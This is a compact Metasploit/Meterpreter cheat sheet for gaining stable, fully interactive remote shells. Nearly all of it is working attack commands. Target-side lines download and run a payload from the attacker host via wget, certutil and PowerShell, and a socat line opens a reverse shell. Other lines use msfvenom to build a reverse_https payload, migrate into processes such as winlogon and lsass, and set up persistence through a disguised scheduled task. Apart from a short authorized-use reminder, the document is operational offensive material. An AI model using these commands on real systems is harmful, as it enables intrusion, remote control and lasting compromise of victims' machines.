# Stable & Fully Interactive Shells — Cheat Sheet (Metasploit / Meterpreter)

> Ultra-compact reference: purely actionable commands & one-line labels. Replace `<...>`.

---

## Legend

* `SESSION`, `PID`, `LHOST`, `LPORT`, `RHOST`, `FILE` — replace as needed
* `meterpreter >` lines are Meterpreter; others are `msf6 >`, shell, or local attacker commands.

---

# 1 — Convert basic shell → fully interactive TTY (Linux)

```bash
# Python PTY (canonical)
python -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade after backgrounding (on your terminal)
# 1) Ctrl+Z in remote shell
# 2) On local: stty raw -echo; fg
# 3) In remote shell: export TERM=xterm-256color; stty rows <R> columns <C>

# Use script if available
script -q /dev/null /bin/bash

# One-shot: use Python + /bin/sh if no bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

# 2 — Fully interactive via socat / netcat (most stable; requires binary upload)

```bash
# Attacker: prepare listener (local)
# Option A: nc (listener)
nc -lvnp <LPORT>

# Option B: socat listener (better)
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# Attacker: serve socat or netcat binary
# (on attacker) python3 -m http.server 80

# Target: download & run socat
wget http://<LHOST>/socat -O /tmp/socat; chmod +x /tmp/socat
/tmp/socat TCP:<LHOST>:<LPORT> EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

---

# 3 — Upgrade shell → Meterpreter (recommended whenever possible)

```bash
# From msfconsole: convert shell to meterpreter
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION <SESSION>
msf6 post(multi/manage/shell_to_meterpreter) > run
```

---

# 4 — Stable interactive (Windows)

```bash
# 1) Upgrade shell → Meterpreter (same as Linux)
msf6 > use post/multi/manage/shell_to_meterpreter
set SESSION <SESSION>
run

# 2) Host & fetch a Meterpreter exe (if conversion not possible)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe
# serve it:
python3 -m http.server 80
# on target (cmd)
certutil -urlcache -split -f http://<LHOST>/met.exe met.exe
met.exe
# or (powershell)
powershell -c "Invoke-WebRequest 'http://<LHOST>/met.exe' -OutFile 'met.exe'; Start-Process met.exe"
```

---

# 5 — Meterpreter: make it resilient (migration & stability)

```bash
# show process info & migrate
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <PID>

# common stable targets (choose by context):
# explorer.exe, services.exe, svchost.exe, winlogon.exe (use caution), lsass.exe (risky)

# spawn a new shell under a different user / process
meterpreter > execute -f C:\Windows\System32\cmd.exe -i -H
```

---

# 6 — Meterpreter persistence (one-liner examples)

```bash
# persistence (background reconnect)
meterpreter > run persistence -U -i 300 -p <LPORT> -r <LHOST>

# alternative: write a scheduled task (example Windows via shell)
meterpreter > shell
C:\> schtasks /Create /SC ONLOGON /TN "UpdSvc" /TR "C:\Windows\Temp\payload.exe" /RL HIGHEST
```

---

# 7 — Interactive helper one-liners & utilities

```bash
# spawn a PTY and keep terminal sane (quick)
python -c 'import pty,os; pty.spawn("/bin/bash")'; export TERM=xterm-256color; stty -a

# upgrade shell -> meterpreter (combined)
msf6 > run post/multi/manage/shell_to_meterpreter SESSION=<SESSION>

# background + migrate (Meterpreter)
meterpreter > background; sessions -u <SESSION>; sessions -i <NEW_SESSION>; migrate <PID>
```

---

# 8 — Troubleshooting quick tips (one-line)

```text
# Ctrl+C kills: use Ctrl+Z then stty raw -echo; fg
# Arrow keys/tab: set TERM and run `export TERM=xterm-256color`
# Programs like vim/top broken: use socat or a real PTY
# Meterpreter dying on process crash: migrate to long-running process
```

---

# 9 — Safety & OPSEC (short)

* Use **only** in authorized engagements.
* Avoid migrating into defensive/critical processes (lsass.exe) unless required and authorized.
* Persistence is noisy—document and coordinate with stakeholders.

---

Authorized tests only.
